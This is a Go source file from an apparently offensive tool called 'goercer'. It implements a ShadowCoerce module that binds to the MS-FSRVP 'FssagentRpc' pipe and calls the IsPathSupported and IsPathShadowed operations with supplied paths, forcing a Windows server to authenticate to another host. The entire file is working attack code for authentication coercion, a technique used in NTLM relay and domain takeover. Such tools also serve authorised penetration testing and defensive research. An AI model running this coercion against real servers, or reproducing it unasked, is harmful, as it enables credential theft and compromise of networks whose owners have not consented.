package coercer

import (
	"goercer/internal/config"
	"goercer/internal/dcerpc"
	"goercer/internal/smbxport"
)

func init() {
	Register("shadowcoerce", func() Coercer { return &ShadowCoerce{} })
}

// ShadowCoerce coerces authentication through the MS-FSRVP (File Server
// Remote VSS Protocol) service.
type ShadowCoerce struct{}

// Name implements Coercer.
func (ShadowCoerce) Name() string { return "shadowcoerce" }

// Description implements Coercer.
func (ShadowCoerce) Description() string { return "ShadowCoerce (MS-FSRVP)" }

const (
	shadowPipe  = "FssagentRpc"
	shadowUUID  = "a8e0653c-2744-4389-a61d-7373df8b2292"
	shadowMajor = 1
	shadowMinor = 0
)

var shadowOpnumNames = map[uint16]string{
	8: "IsPathSupported",
	9: "IsPathShadowed",
}

func shadowOpnumName(op uint16) string {
	if n, ok := shadowOpnumNames[op]; ok {
		return n
	}
	return "Unknown"
}

// Execute implements Coercer.
func (s ShadowCoerce) Execute(sess *smbxport.Session, cfg *config.Config, out *Out) (*Result, error) {
	bound, err := Bind(sess, cfg, out, shadowPipe, shadowUUID, shadowMajor, shadowMinor)
	if err != nil {
		return nil, err
	}
	defer bound.Close()

	opnums := []uint16{8, 9}
	attempted := make([]uint16, len(opnums))
	copy(attempted, opnums)

	paths := Paths(cfg)
	fire := func(op uint16, path string) (bool, error) {
		stub := shadowStub(path)
		err := dcerpc.Transaction(bound.Pipe, bound.Auth, op, stub)
		if dcerpc.IsCoercionSuccess(err) {
			return true, err
		}
		if err == nil {
			return true, err
		}
		return false, err
	}

	successful, lastErr := runOpnums(cfg, paths, out, opnums, shadowOpnumName, fire)
	res := newResult(cfg, successful, attempted, lastErr)
	if successful >= 0 {
		out.Info("[+] Coercion triggered via opnum %d", successful)
	} else if lastErr != nil {
		out.Info("[!] No opnum succeeded; last error: %v", lastErr)
	}
	return res, lastErr
}

// shadowStub builds the MS-FSRVP ShareName parameter (conformant varying
// string).
func shadowStub(path string) []byte {
	return uint16StringStub(path, 0)
}
